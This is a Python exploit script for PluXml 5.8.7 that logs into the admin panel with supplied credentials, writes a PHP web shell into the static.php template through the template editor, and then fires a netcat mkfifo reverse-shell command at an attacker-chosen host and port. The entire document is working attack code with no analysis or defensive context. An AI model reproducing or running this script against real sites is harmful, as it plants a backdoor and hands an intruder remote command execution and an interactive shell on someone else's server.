# PluXml 5.8.7

import sys
import urllib.parse

import requests
from bs4 import BeautifulSoup

def get_token(s, url, path):
    try:
        r = s.get(url + path, verify=False)
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, 'html.parser')
            token = soup.find('input', {'name':'token'})['value']
            return token
        else:
            sys.exit(f'[-] Error: {r.status_code}, check your connection or URL')
    except Exception:
        sys.exit(f'[-] Unexpected error before server could respond, check: {url}')

def login(s, url, user, passwd):
    auth_path = '/core/admin/auth.php?p=/core/admin/'
    token = get_token(s, url, auth_path)

    login_path = f'/core/admin/auth.php?p={url}' + '/core/admin'
    headers = {'Content-type': 'application/x-www-form-urlencoded'}
    data = {'token': token, 'login': user, 'password': passwd}

    r = s.post(url + login_path, data=data, verify=False, headers=headers)
    auth_failed = 'Incorrect login or password'
    if r.status_code == 200:
        if auth_failed in r.text:
            sys.exit('[-] Error: ' + auth_failed)
        else:
            print(f'[+] Successfully logged in as: {user}')
            return s 
    else:
        sys.exit(f'[-] Error: {r.status_code}, check your connection or URL')

def exploit_template(s, url, rhost, rport):
    edit_path = '/core/admin/parametres_edittpl.php'
    token = get_token(s, url, edit_path)
    
    headers = {'Content-type': 'application/x-www-form-urlencoded'}
    content = """<?php include __DIR__.'/header.php'; ?>
        <main class="main">
                <div class="container">
                        <div class="grid">
                                <div class="content col sml-12 med-9">
                                        <article class="article static" id="static-page-<?php echo $plxShow->staticId(); ?>">
                                                <header>
                                                        <h2>
                                                                <?php $plxShow->staticTitle(); ?>
                                                        </h2>
                                                </header>
                                                <?php $plxShow->staticContent(); ?>
                                        </article>
                                </div>
                                <?php include __DIR__.'/sidebar.php'; ?>
                        </div>
                </div>
        </main>
        """
    footer = "<?php include __DIR__.'/footer.php'; ?>"
    simple_web_shell = "<?php system($_GET['cmd']); ?>"

    data = {'token': token, 'template': 'static.php', 'load': 'Load', 'tpl': 'static.php', 'content': content + footer}
    r = s.post(url + edit_path, data=data, verify=False, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    token = soup.find('input', {'name':'token'})['value']   
    
    print('[+] Attemtping to save template...')
    data = {'token': token, 'template': 'static.php', 'submit': 'Save the file', 'tpl': 'static.php', 'content': content + simple_web_shell + footer}
    s.post(url + edit_path, data=data, verify=False, headers=headers)

    # change reverse shell type and/or bash path as appropriate
    rev_shell = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/bash -i 2>&1|nc {rhost} {rport}>/tmp/f'
    enc_rshell = urllib.parse.quote(rev_shell, safe='') 
    exploited_path = '/index.php?static1/static-1'
    print('[+] Check your listener...')
    s.get(url + exploited_path + f'&cmd={enc_rshell}', verify=False, headers=headers)

def main():
    if len(sys.argv) != 6:
        print(f'[-] Usage:   {sys.argv[0]} <URL> <UserName> <Password> <RHOST> <RPORT>')
        print(f'[-] Example: {sys.argv[0]} http://example.com admin pass123 192.168.10.10 443')
        sys.exit(-1)

    url = sys.argv[1]
    user = sys.argv[2]
    passwd = sys.argv[3]
    rhost = sys.argv[4]
    rport = sys.argv[5]
    
    s = requests.Session()

    print('[+] Attempting login...')
    client = login(s, url, user, passwd)

    print('[+] Attempting to modify template...')
    exploit_template(client, url, rhost, rport)

if __name__ == "__main__":
    main()
